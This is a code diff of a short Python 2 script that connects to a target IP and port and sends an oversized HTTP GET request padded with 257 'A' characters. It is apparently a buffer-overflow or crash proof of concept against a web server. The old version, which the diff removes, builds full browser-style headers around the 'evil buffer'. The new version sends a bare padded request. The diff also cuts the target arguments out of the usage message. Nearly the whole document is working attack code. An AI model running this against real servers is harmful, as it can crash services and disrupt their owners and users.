@@ -46,49 +46,24 @@ import socket
 
 def main(argv):
   argc = len(argv)
+
   if argc != 3:
-    print "usage: %s <target-ip> <target-port>" % (argv[0])
+    print "usage: %s " % (argv[0])
     sys.exit(0)
 
-  try:
-    host = argv[1]
-    port = int(argv[2])
-     
-    print "[*] Sending evil buffer to: %s:%d" % (host, port)
-    size = 257
-    #size = 1
-    inputBuffer = "A" * size
-    content = inputBuffer
+  host = argv[1]
+  port = int(argv[2])
 
-    #-- Recreate the TCP headers as seen from wireshark --#
-    buff  = "GET %s/index.html HTTP/1.1\r\n" % content
-    #buff  = "GET /index.html HTTP/1.1\r\n" # This gets a 200 OK
-    buff += "Host: %s:%d\r\n" % (host,port)
-    buff += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
-    buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-    buff += "Accept-Language: en-US,en;q=0.5\r\n"
-    buff += "Accept-Encoding: gzip, deflate\r\n"
-    buff += "DNT: 1\r\n"
-    buff += "Connection: keep-alive\r\n"
-    buff += "Cookie: wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1597488494\r\n"
-    buff += "Upgrade-Insecure-Requests: 1\r\n"
-    buff += "\r\n"
+  print "[*] target: %s:%d" % (host, port)
 
-    # Check output of different payloads
-    #payload = inputBuffer + "/index.html HTTP/1.1\r\n\r\n"
-    #payload = content + buff + "\r\n\r\n"
-    payload = buff + "\r\n\r\n"
-     
-    print "[*] payload: %s" % (payload)
-     
-    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sd.connect((host, port))
-    sd.send(payload)
-    sd.close()
+  payload = "A" * 257 + "/index.html HTTP/1.1\r\n\r\n"
 
-    print "\nDone!"
-  except:
-    print "Could not connect!"
+  print "[*] payload: %s" % (payload)
+
+  sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sd.connect((host, port))
+  sd.send(payload)
+  sd.close()
 
 if __name__ == "__main__":
   main(sys.argv)
